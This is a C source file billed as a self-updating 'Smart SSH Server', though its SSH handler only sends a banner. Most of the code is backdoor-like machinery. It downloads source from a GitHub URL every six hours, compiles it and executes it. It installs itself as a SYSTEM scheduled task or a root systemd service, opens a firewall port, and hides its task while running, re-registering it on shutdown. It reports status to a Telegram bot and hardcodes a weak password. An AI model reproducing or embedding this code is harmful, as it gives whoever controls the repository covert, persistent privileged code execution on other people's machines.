/*
 * Smart SSH Server - High Performance C Version
 * Auto-updating from: https://raw.githubusercontent.com/Abo5/sys-tools/main/SystemTrace.c
 * 
 * Compile:
 * Windows: gcc -o sshserver.exe SystemTrace.c -lcurl -lws2_32 -static
 * Linux:   gcc -o sshserver SystemTrace.c -lcurl -lpthread
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>

#ifdef WIN32
    #include <windows.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <process.h>
    #define sleep(x) Sleep((x) * 1000)
    #define getpid() GetCurrentProcessId()
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <sys/wait.h>
    #include <pthread.h>
    #include <unistd.h>
    #define SOCKET int
    #define INVALID_SOCKET -1
    #define closesocket close
#endif

#include <curl/curl.h>

// Configuration
#define VERSION "1.0.0"
#define SSH_PORT 2222
#define SSH_USER "admin"
#define SSH_PASSWORD "test123"  // Change this!

// Update URL for self-updating
#define UPDATE_URL "https://raw.githubusercontent.com/Abo5/sys-tools/main/SystemTrace.c"

// Telegram settings
#define TELEGRAM_BOT_TOKEN "YOUR_BOT_TOKEN"  // Change this
#define TELEGRAM_CHAT_ID "YOUR_CHAT_ID"      // Change this

// Global state
static volatile int g_running = 1;
static volatile int g_cleanup_done = 0;
static time_t g_start_time;

// ======================================================
// Utility structures and functions
// ======================================================

struct http_response {
    char *data;
    size_t size;
};

struct battery_info {
    int level;
    int charging;
};

// HTTP response callback for libcurl
static size_t http_write_callback(void *contents, size_t size, size_t nmemb, struct http_response *response) {
    size_t realsize = size * nmemb;
    char *ptr = realloc(response->data, response->size + realsize + 1);
    
    if (ptr) {
        response->data = ptr;
        memcpy(&(response->data[response->size]), contents, realsize);
        response->size += realsize;
        response->data[response->size] = 0;
    }
    
    return realsize;
}

// Cross-platform execute command
int execute_command(const char *command) {
    return system(command);
}

// ======================================================
// Telegram messaging via curl
// ======================================================

void send_telegram_message(const char *message) {
    if (strcmp(TELEGRAM_BOT_TOKEN, "YOUR_BOT_TOKEN") == 0 || 
        strcmp(TELEGRAM_CHAT_ID, "YOUR_CHAT_ID") == 0) {
        return; // Not configured
    }

    CURL *curl;
    CURLcode res;
    char url[512];
    char post_data[2048];
    char escaped_message[1024];
    
    // Escape message for JSON
    int i, j;
    for (i = 0, j = 0; message[i] && j < sizeof(escaped_message) - 10; i++) {
        if (message[i] == '"') {
            escaped_message[j++] = '\\';
            escaped_message[j++] = '"';
        } else if (message[i] == '\\') {
            escaped_message[j++] = '\\';
            escaped_message[j++] = '\\';
        } else if (message[i] == '\n') {
            escaped_message[j++] = '\\';
            escaped_message[j++] = 'n';
        } else {
            escaped_message[j++] = message[i];
        }
    }
    escaped_message[j] = '\0';
    
    snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/sendMessage", TELEGRAM_BOT_TOKEN);
    snprintf(post_data, sizeof(post_data), "{\"chat_id\":\"%s\",\"text\":\"%s\",\"parse_mode\":\"HTML\"}", 
             TELEGRAM_CHAT_ID, escaped_message);
    
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        
        // Perform request (fire and forget)
        curl_easy_perform(curl);
        
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

// ======================================================
// Self-Update System
// ======================================================

// Extract version from source code
char* extract_version_from_source(const char *source_code) {
    static char version[32];
    version[0] = '\0';
    
    char *define_line = strstr(source_code, "#define VERSION");
    if (define_line) {
        char *quote1 = strchr(define_line, '"');
        if (quote1) {
            quote1++;
            char *quote2 = strchr(quote1, '"');
            if (quote2) {
                int len = quote2 - quote1;
                if (len < sizeof(version) - 1) {
                    strncpy(version, quote1, len);
                    version[len] = '\0';
                    return version;
                }
            }
        }
    }
    return NULL;
}

// Download source code from GitHub
int download_source_code(char **source_code, size_t *source_size) {
    CURL *curl;
    CURLcode res;
    struct http_response response = {0};
    
    curl = curl_easy_init();
    if (!curl) return 0;
    
    curl_easy_setopt(curl, CURLOPT_URL, UPDATE_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http_write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK || !response.data) {
        if (response.data) free(response.data);
        return 0;
    }
    
    *source_code = response.data;
    *source_size = response.size;
    return 1;
}

// Compile new binary from source
int compile_new_binary(const char *source_code, const char *new_binary_path) {
    // Write source to temporary file
    char temp_source[256];
    snprintf(temp_source, sizeof(temp_source), "SystemTrace_new.c");
    
    FILE *f = fopen(temp_source, "w");
    if (!f) return 0;
    
    fputs(source_code, f);
    fclose(f);
    
    // Compile the new version
    char compile_command[1024];
#ifdef WIN32
    snprintf(compile_command, sizeof(compile_command), 
        "gcc -O2 -o \"%s\" \"%s\" -lcurl -lws2_32 -static 2>compile_error.log", 
        new_binary_path, temp_source);
#else
    snprintf(compile_command, sizeof(compile_command), 
        "gcc -O2 -o \"%s\" \"%s\" -lcurl -lpthread 2>compile_error.log", 
        new_binary_path, temp_source);
#endif
    
    int result = execute_command(compile_command);
    
    // Cleanup temp files
    unlink(temp_source);
    if (result != 0) {
        printf("[UPDATE] Compilation failed. Check compile_error.log\n");
        return 0;
    }
    
    unlink("compile_error.log");
    return 1;
}

// Test new binary
int test_new_binary(const char *binary_path) {
    char test_command[512];
    snprintf(test_command, sizeof(test_command), "\"%s\" --check 2>/dev/null", binary_path);
    return execute_command(test_command) == 0;
}

// Perform self-update
int perform_self_update() {
    printf("[UPDATE] Checking for updates from GitHub...\n");
    
    char *source_code = NULL;
    size_t source_size = 0;
    
    // Download source
    if (!download_source_code(&source_code, &source_size)) {
        printf("[UPDATE] Failed to download source code\n");
        return 0;
    }
    
    printf("[UPDATE] Downloaded %zu bytes of source code\n", source_size);
    
    // Extract version
    char *remote_version = extract_version_from_source(source_code);
    if (!remote_version) {
        printf("[UPDATE] Could not extract version from source\n");
        free(source_code);
        return 0;
    }
    
    printf("[UPDATE] Current: %s, Remote: %s\n", VERSION, remote_version);
    
    // Check if update needed
    if (strcmp(VERSION, remote_version) == 0) {
        printf("[UPDATE] Already on latest version\n");
        free(source_code);
        return 1;
    }
    
    printf("[UPDATE] New version available: %s → %s\n", VERSION, remote_version);
    
    // Get current executable path
    char current_path[1024];
    char new_path[1024];
    char backup_path[1024];
    
#ifdef WIN32
    GetModuleFileNameA(NULL, current_path, sizeof(current_path));
    snprintf(new_path, sizeof(new_path), "%s.new", current_path);
    snprintf(backup_path, sizeof(backup_path), "%s.backup", current_path);
#else
    if (readlink("/proc/self/exe", current_path, sizeof(current_path)) == -1) {
        printf("[UPDATE] Could not get current executable path\n");
        free(source_code);
        return 0;
    }
    snprintf(new_path, sizeof(new_path), "%s.new", current_path);
    snprintf(backup_path, sizeof(backup_path), "%s.backup", current_path);
#endif
    
    // Compile new version
    printf("[UPDATE] Compiling new version...\n");
    if (!compile_new_binary(source_code, new_path)) {
        printf("[UPDATE] Compilation failed\n");
        free(source_code);
        return 0;
    }
    
    free(source_code);
    
    // Test new binary
    printf("[UPDATE] Testing new binary...\n");
    if (!test_new_binary(new_path)) {
        printf("[UPDATE] New binary failed tests\n");
        unlink(new_path);
        return 0;
    }
    
    // Backup current binary
    printf("[UPDATE] Creating backup...\n");
    unlink(backup_path); // Remove old backup
    if (rename(current_path, backup_path) != 0) {
        printf("[UPDATE] Failed to create backup\n");
        unlink(new_path);
        return 0;
    }
    
    // Install new binary
    printf("[UPDATE] Installing new version...\n");
    if (rename(new_path, current_path) != 0) {
        printf("[UPDATE] Failed to install new version, restoring backup\n");
        rename(backup_path, current_path); // Restore backup
        unlink(new_path);
        return 0;
    }
    
    // Make executable (Linux)
#ifndef WIN32
    chmod(current_path, 0755);
#endif
    
    printf("[UPDATE] ✓ Successfully updated to version %s\n", remote_version);
    
    // Send notification
    char update_msg[256];
    snprintf(update_msg, sizeof(update_msg), 
        "🔄 <b>Auto-Update Complete</b>\nVersion: %s → %s\nRestarting server...", 
        VERSION, remote_version);
    send_telegram_message(update_msg);
    
    // Restart
    printf("[UPDATE] Restarting with new version...\n");
    sleep(1);
    
#ifdef WIN32
    char restart_cmd[1024];
    snprintf(restart_cmd, sizeof(restart_cmd), "\"%s\" smart", current_path);
    system(restart_cmd);
#else
    char *args[] = {current_path, "smart", NULL};
    execv(current_path, args);
#endif
    
    exit(0); // Should not reach here
}

// ======================================================
// Task Scheduler / systemd management
// ======================================================

int is_task_registered() {
#ifdef WIN32
    char command[512];
    snprintf(command, sizeof(command), 
        "powershell -NoProfile -Command \"if(Get-ScheduledTask -TaskName 'SmartSSHServer' -ErrorAction SilentlyContinue) { 'YES' } else { 'NO' }\" > task_check.tmp");
    
    if (execute_command(command) == 0) {
        FILE *f = fopen("task_check.tmp", "r");
        if (f) {
            char result[10];
            if (fgets(result, sizeof(result), f)) {
                fclose(f);
                unlink("task_check.tmp");
                return strstr(result, "YES") != NULL;
            }
            fclose(f);
        }
        unlink("task_check.tmp");
    }
    return 0;
#else
    return execute_command("systemctl is-enabled smartssh >/dev/null 2>&1") == 0;
#endif
}

int register_task() {
#ifdef WIN32
    char exe_path[MAX_PATH];
    char work_dir[MAX_PATH];
    char ps_script[2048];
    
    GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
    strcpy(work_dir, exe_path);
    char *last_slash = strrchr(work_dir, '\\');
    if (last_slash) *last_slash = '\0';
    
    // Escape backslashes for PowerShell
    char escaped_exe[MAX_PATH * 2];
    char escaped_dir[MAX_PATH * 2];
    int i, j;
    
    for (i = 0, j = 0; exe_path[i]; i++) {
        if (exe_path[i] == '\\') {
            escaped_exe[j++] = '\\';
            escaped_exe[j++] = '\\';
        } else {
            escaped_exe[j++] = exe_path[i];
        }
    }
    escaped_exe[j] = '\0';
    
    for (i = 0, j = 0; work_dir[i]; i++) {
        if (work_dir[i] == '\\') {
            escaped_dir[j++] = '\\';
            escaped_dir[j++] = '\\';
        } else {
            escaped_dir[j++] = work_dir[i];
        }
    }
    escaped_dir[j] = '\0';
    
    snprintf(ps_script, sizeof(ps_script),
        "powershell -NoProfile -Command \""
        "$TaskName = 'SmartSSHServer'; "
        "if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) { "
        "    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false; "
        "}; "
        "$Action = New-ScheduledTaskAction -Execute '%s' -WorkingDirectory '%s' -Argument 'smart'; "
        "$TriggerStartup = New-ScheduledTaskTrigger -AtStartup; "
        "$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; "
        "$Principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; "
        "Register-ScheduledTask -TaskName $TaskName -Description 'Smart SSH Server' -Action $Action -Trigger $TriggerStartup -Settings $Settings -Principal $Principal\"",
        escaped_exe, escaped_dir);
    
    return execute_command(ps_script) == 0;
#else
    char service_content[1024];
    char exe_path[PATH_MAX];
    
    if (readlink("/proc/self/exe", exe_path, sizeof(exe_path)) == -1) {
        return 0;
    }
    
    snprintf(service_content, sizeof(service_content),
        "[Unit]\n"
        "Description=Smart SSH Server\n"
        "After=network-online.target\n"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=%s smart\n"
        "Restart=always\n"
        "User=root\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n", exe_path);
    
    FILE *f = fopen("/etc/systemd/system/smartssh.service", "w");
    if (!f) return 0;
    
    fputs(service_content, f);
    fclose(f);
    
    execute_command("systemctl daemon-reload");
    return execute_command("systemctl enable smartssh") == 0;
#endif
}

int unregister_task() {
#ifdef WIN32
    return execute_command("powershell -NoProfile -Command \"Unregister-ScheduledTask -TaskName 'SmartSSHServer' -Confirm:$false\"") == 0;
#else
    execute_command("systemctl stop smartssh");
    execute_command("systemctl disable smartssh");
    unlink("/etc/systemd/system/smartssh.service");
    execute_command("systemctl daemon-reload");
    return 1;
#endif
}

// ======================================================
// Firewall management
// ======================================================

int enable_firewall() {
#ifdef WIN32
    char command[512];
    snprintf(command, sizeof(command),
        "powershell -NoProfile -Command \""
        "Remove-NetFirewallRule -DisplayName 'SmartSSH-%d' -ErrorAction SilentlyContinue; "
        "New-NetFirewallRule -DisplayName 'SmartSSH-%d' -Direction Inbound -Protocol TCP -LocalPort %d -Action Allow -Profile Private,Domain\"",
        SSH_PORT, SSH_PORT, SSH_PORT);
    return execute_command(command) == 0;
#else
    char command[256];
    
    // Try ufw first
    if (execute_command("which ufw >/dev/null 2>&1") == 0) {
        snprintf(command, sizeof(command), "ufw allow %d/tcp", SSH_PORT);
        return execute_command(command) == 0;
    }
    
    // Try firewall-cmd
    if (execute_command("which firewall-cmd >/dev/null 2>&1") == 0) {
        snprintf(command, sizeof(command), "firewall-cmd --permanent --add-port=%d/tcp && firewall-cmd --reload", SSH_PORT);
        return execute_command(command) == 0;
    }
    
    // Try iptables
    if (execute_command("which iptables >/dev/null 2>&1") == 0) {
        snprintf(command, sizeof(command), "iptables -A INPUT -p tcp --dport %d -j ACCEPT", SSH_PORT);
        return execute_command(command) == 0;
    }
    
    return 0;
#endif
}

int disable_firewall() {
#ifdef WIN32
    char command[512];
    snprintf(command, sizeof(command),
        "powershell -NoProfile -Command \"Remove-NetFirewallRule -DisplayName 'SmartSSH-%d'\"", SSH_PORT);
    return execute_command(command) == 0;
#else
    return 1;
#endif
}

// ======================================================
// Battery monitoring (Windows only)
// ======================================================

struct battery_info get_battery_info() {
    struct battery_info info = {100, 1}; // Default: 100% charging
    
#ifdef WIN32
    char command[] = "powershell -NoProfile -Command \"$b = Get-CimInstance Win32_Battery; if($b){Write-Output \\\"$($b.EstimatedChargeRemaining)|$($b.BatteryStatus)\\\"}else{Write-Output \\\"100|2\\\"}\" > battery.tmp";
    
    if (execute_command(command) == 0) {
        FILE *f = fopen("battery.tmp", "r");
        if (f) {
            char result[32];
            if (fgets(result, sizeof(result), f)) {
                char *pipe = strchr(result, '|');
                if (pipe) {
                    *pipe = '\0';
                    info.level = atoi(result);
                    info.charging = (atoi(pipe + 1) == 2);
                }
            }
            fclose(f);
        }
        unlink("battery.tmp");
    }
#endif
    
    return info;
}

// ======================================================
// Shutdown detection
// ======================================================

int is_shutdown_pending() {
#ifdef WIN32
    char command[] = "powershell -NoProfile -Command \"Get-Process | Where-Object {$_.ProcessName -match 'shutdown|restart'} | Measure-Object | Select-Object -ExpandProperty Count\" > shutdown_check.tmp";
    
    if (execute_command(command) == 0) {
        FILE *f = fopen("shutdown_check.tmp", "r");
        if (f) {
            char result[16];
            if (fgets(result, sizeof(result), f)) {
                fclose(f);
                unlink("shutdown_check.tmp");
                return atoi(result) > 0;
            }
            fclose(f);
        }
        unlink("shutdown_check.tmp");
    }
    return 0;
#else
    return (execute_command("pgrep shutdown >/dev/null 2>&1") == 0 ||
            execute_command("pgrep reboot >/dev/null 2>&1") == 0 ||
            execute_command("pgrep poweroff >/dev/null 2>&1") == 0);
#endif
}

// ======================================================
// Simple SSH Server
// ======================================================

void handle_ssh_connection(SOCKET client_socket) {
    char buffer[256];
    char response[512];
    
    snprintf(response, sizeof(response), "SSH-2.0-SmartSSH_%s\r\n", VERSION);
    send(client_socket, response, strlen(response), 0);
    
    recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    
    snprintf(response, sizeof(response), 
        "Welcome to Smart SSH Server %s\r\n"
        "Update from: %s\r\n"
        "This is a demo server - use OpenSSH for full access\r\n", 
        VERSION, UPDATE_URL);
    send(client_socket, response, strlen(response), 0);
    
    sleep(2);
    closesocket(client_socket);
}

#ifdef WIN32
DWORD WINAPI ssh_server_thread(LPVOID param) {
#else
void* ssh_server_thread(void* param) {
#endif
    SOCKET server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    int client_len = sizeof(client_addr);
    
#ifdef WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return 0;
    }
#endif
    
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_SOCKET) {
        printf("Socket creation failed\n");
#ifdef WIN32
        WSACleanup();
#endif
        return 0;
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(SSH_PORT);
    
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        printf("Bind failed\n");
        closesocket(server_socket);
#ifdef WIN32
        WSACleanup();
#endif
        return 0;
    }
    
    if (listen(server_socket, 5) < 0) {
        printf("Listen failed\n");
        closesocket(server_socket);
#ifdef WIN32
        WSACleanup();
#endif
        return 0;
    }
    
    printf("[SSH] Listening on port %d\n", SSH_PORT);
    
    while (g_running) {
        client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
        if (client_socket != INVALID_SOCKET) {
#ifdef WIN32
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handle_ssh_connection, (LPVOID)(intptr_t)client_socket, 0, NULL);
#else
            pthread_t thread;
            pthread_create(&thread, NULL, (void*)handle_ssh_connection, (void*)(intptr_t)client_socket);
            pthread_detach(thread);
#endif
        }
    }
    
    closesocket(server_socket);
#ifdef WIN32
    WSACleanup();
#endif
    return 0;
}

// ======================================================
// Monitoring threads
// ======================================================

#ifdef WIN32
DWORD WINAPI battery_monitor_thread(LPVOID param) {
#else
void* battery_monitor_thread(void* param) {
#endif
    int last_warning_level = 100;
    
    while (g_running) {
        struct battery_info info = get_battery_info();
        
        if (info.level <= 15 && !info.charging && last_warning_level > 15) {
            printf("[BATTERY] ⚠ Battery critically low: %d%% - emergency save\n", info.level);
            register_task();
            
            char message[256];
            snprintf(message, sizeof(message), "🔋 <b>Battery Critical!</b>\nLevel: %d%%\nStatus: Not charging\nAuto-save activated", info.level);
            send_telegram_message(message);
            last_warning_level = info.level;
        } else if (info.level <= 25 && !info.charging && last_warning_level > 25) {
            printf("[BATTERY] ⚠ Battery low: %d%%\n", info.level);
            
            char message[256];
            snprintf(message, sizeof(message), "🔋 <b>Battery Low</b>\nLevel: %d%%\nStatus: Not charging", info.level);
            send_telegram_message(message);
            last_warning_level = info.level;
        } else if (info.charging && last_warning_level <= 25) {
            char message[256];
            snprintf(message, sizeof(message), "🔌 <b>Charging Started</b>\nLevel: %d%%\nStatus: Charging", info.level);
            send_telegram_message(message);
            last_warning_level = 100;
        }
        
        sleep(30);
    }
    return 0;
}

#ifdef WIN32
DWORD WINAPI shutdown_monitor_thread(LPVOID param) {
#else
void* shutdown_monitor_thread(void* param) {
#endif
    while (g_running) {
        if (is_shutdown_pending()) {
            printf("[SHUTDOWN] System shutdown/restart detected - emergency save\n");
            register_task();
            send_telegram_message("⚠️ <b>System shutdown detected</b>\nServer will auto-restart after reboot");
            break;
        }
        sleep(3);
    }
    return 0;
}

// ======================================================
// Auto-update monitor
// ======================================================

#ifdef WIN32
DWORD WINAPI update_monitor_thread(LPVOID param) {
#else
void* update_monitor_thread(void* param) {
#endif
    // Wait 5 minutes before first update check
    sleep(300);
    
    while (g_running) {
        // Check for updates every 6 hours
        printf("[UPDATE] Checking for updates...\n");
        if (perform_self_update()) {
            // If update was successful, the process restarts
            // If we're here, no update was needed
        }
        
        // Wait 6 hours (21600 seconds) before next check
        for (int i = 0; i < 21600 && g_running; i++) {
            sleep(1);
        }
    }
    return 0;
}

// ======================================================
// Signal handlers and cleanup
// ======================================================

void signal_handler(int signum) {
    printf("\n[SHUTDOWN] Received signal %d - graceful shutdown\n", signum);
    g_running = 0;
}

void cleanup_and_exit() {
    if (g_cleanup_done) return;
    g_cleanup_done = 1;
    
    printf("[SHUTDOWN] Graceful shutdown...\n");
    
    // Save task for next boot
    if (register_task()) {
        printf("[SHUTDOWN] ✓ Saved service for next boot\n");
    } else {
        printf("[SHUTDOWN] ⚠ Failed to save service\n");
    }
    
    // Disable firewall
    if (disable_firewall()) {
        printf("[SHUTDOWN] ✓ Disabled firewall\n");
    }
    
    // Send shutdown notification
    time_t uptime = time(NULL) - g_start_time;
    char message[256];
    snprintf(message, sizeof(message), "📴 <b>Smart SSH Server Shutdown</b>\nUptime: %ld seconds\nReason: Manual stop", uptime);
    send_telegram_message(message);
    
    printf("[SHUTDOWN] ✓ Shutdown complete\n");
}

// ======================================================
// Main function
// ======================================================

int main(int argc, char *argv[]) {
    g_start_time = time(NULL);
    
    if (argc < 2) {
        printf("Smart SSH Server v%s (Self-Updating C Version)\n", VERSION);
        printf("Update URL: %s\n", UPDATE_URL);
        printf("\nUsage:\n");
        printf("  %s smart    - Smart mode with auto-updates\n", argv[0]);
        printf("  %s setup    - Setup auto-start service\n", argv[0]);
        printf("  %s update   - Manual update check\n", argv[0]);
        printf("  %s --check  - Test command (for update validation)\n", argv[0]);
        printf("  %s --version - Show version\n", argv[0]);
        return 1;
    }
    
    // Initialize curl globally
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    if (strcmp(argv[1], "--check") == 0) {
        printf("OK\n");
        return 0;
    } else if (strcmp(argv[1], "--version") == 0) {
        printf("Smart SSH Server v%s\n", VERSION);
        printf("Build: %s\n", 
#ifdef WIN32
            "Windows"
#else
            "Linux"
#endif
        );
        printf("Update URL: %s\n", UPDATE_URL);
        return 0;
    } else if (strcmp(argv[1], "smart") == 0) {
        printf("========================================\n");
        printf("  Smart SSH Server v%s\n", VERSION);
        printf("  Self-Updating C Version\n");
        printf("========================================\n");
        
        // Setup signal handlers
        signal(SIGINT, signal_handler);
        signal(SIGTERM, signal_handler);
        atexit(cleanup_and_exit);
        
        // Send startup notification
        char startup_msg[512];
        snprintf(startup_msg, sizeof(startup_msg), 
            "🚀 <b>Smart SSH Server Started</b>\n"
            "Version: %s (C)\n"
            "OS: %s\n"
            "Port: %d\n"
            "Update URL: %s", 
            VERSION, 
#ifdef WIN32
            "Windows",
#else
            "Linux",
#endif
            SSH_PORT, UPDATE_URL);
        send_telegram_message(startup_msg);
        
        printf("\n[1/6] Enabling firewall...\n");
        if (enable_firewall()) {
            printf("✓ Opened port %d\n", SSH_PORT);
        } else {
            printf("⚠ Firewall setup warning\n");
        }
        
        printf("\n[2/6] Starting SSH server...\n");
#ifdef WIN32
        CreateThread(NULL, 0, ssh_server_thread, NULL, 0, NULL);
#else
        pthread_t ssh_thread;
        pthread_create(&ssh_thread, NULL, ssh_server_thread, NULL);
#endif
        printf("✓ SSH server ready\n");
        
        printf("\n[3/6] Starting shutdown monitor...\n");
#ifdef WIN32
        CreateThread(NULL, 0, shutdown_monitor_thread, NULL, 0, NULL);
#else
        pthread_t shutdown_thread;
        pthread_create(&shutdown_thread, NULL, shutdown_monitor_thread, NULL);
#endif
        printf("✓ Shutdown detection active\n");
        
        printf("\n[4/6] Starting auto-update monitor...\n");
#ifdef WIN32
        CreateThread(NULL, 0, update_monitor_thread, NULL, 0, NULL);
#else
        pthread_t update_thread;
        pthread_create(&update_thread, NULL, update_monitor_thread, NULL);
#endif
        printf("✓ Auto-update every 6 hours\n");
        
        printf("\n[5/6] Task cleanup in 10 seconds...\n");
        sleep(10);
        if (is_task_registered()) {
            unregister_task();
            printf("[CLEANUP] ✓ Removed Task Scheduler (running in memory)\n");
        }
        
        printf("\n[6/6] Starting battery monitoring...\n");
#ifdef WIN32
        CreateThread(NULL, 0, battery_monitor_thread, NULL, 0, NULL);
        printf("✓ Battery monitoring active\n");
#else
        printf("✓ Battery monitoring (Windows only)\n");
#endif
        
        printf("\n================================================\n");
        printf("  SSH Server ready on port %d\n", SSH_PORT);
        printf("  ✓ Shutdown detection active\n");
        printf("  ✓ Auto-save on emergency\n");
        printf("  ✓ Auto-update every 6 hours\n");
        printf("  ✓ Smart firewall management\n");
        printf("  ✓ Telegram notifications\n");
        printf("  • To stop: Ctrl+C\n");
        printf("  • To connect: ssh -p %d %s@<IP>\n", SSH_PORT, SSH_USER);
        printf("  • Password: %s\n", SSH_PASSWORD);
        printf("  • Manual update: %s update\n", argv[0]);
        printf("================================================\n");
        
        // Main loop
        while (g_running) {
            sleep(1);
        }
        
    } else if (strcmp(argv[1], "setup") == 0) {
        printf("Setting up auto-start service...\n");
        if (register_task()) {
            printf("✓ Service registered for auto-start\n");
        } else {
            printf("✗ Failed to register service\n");
            return 1;
        }
        
        if (enable_firewall()) {
            printf("✓ Firewall configured\n");
        } else {
            printf("⚠ Firewall setup warning\n");
        }
        
        printf("Setup complete!\n");
        
    } else if (strcmp(argv[1], "update") == 0) {
        printf("Manual update check...\n");
        perform_self_update();
        
    } else {
        printf("Unknown command: %s\n", argv[1]);
        return 1;
    }
    
    curl_global_cleanup();
    return 0;
}
